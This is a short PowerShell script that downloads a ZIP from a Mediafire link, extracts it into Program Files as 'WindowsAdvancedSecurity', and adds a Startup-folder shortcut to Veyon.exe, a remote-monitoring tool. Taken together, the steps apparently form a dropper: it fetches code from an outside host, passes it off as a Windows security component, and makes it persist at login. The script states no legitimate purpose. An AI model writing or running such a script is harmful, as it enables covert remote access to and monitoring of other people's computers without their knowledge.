# Download the ZIP file from Mediafire
$downloadLink = "https://download843.mediafire.com/qx6s9adx4pvgraPltumC-mG6EOI9RZteoLlgHDmFzeloHehnhbwX2vIxASH3Ue9w3jwC1YSizkKvTI0o-2FPLyIUOCpuuutS46ZIp3R8i-5y_BHd7NmRXvYalF3bX2HBzf1zrURRw5kQGAzwFPjBgnWkjq4K9Utif2PI9p6y/s1m5k1yhrjbbpk0/WindowsAdvancedSecurity.zip"
$destinationPath = "C:\WindowsAdvancedSecurity.zip"
Invoke-WebRequest -Uri $downloadLink -OutFile $destinationPath

# Extract the ZIP to the desired directory using -Force
$extractToPath = "C:\Program Files\"
Expand-Archive -Path $destinationPath -DestinationPath $extractToPath -Force

# Create a shortcut for Veyon.exe and place it in the startup folder
$WScriptShell = New-Object -ComObject WScript.Shell
$Shortcut = $WScriptShell.CreateShortcut("$($WScriptShell.SpecialFolders('Startup'))\Veyon.lnk")
$Shortcut.TargetPath = "C:\Program Files\WindowsAdvancedSecurity\Veyon.exe"
$Shortcut.Save()
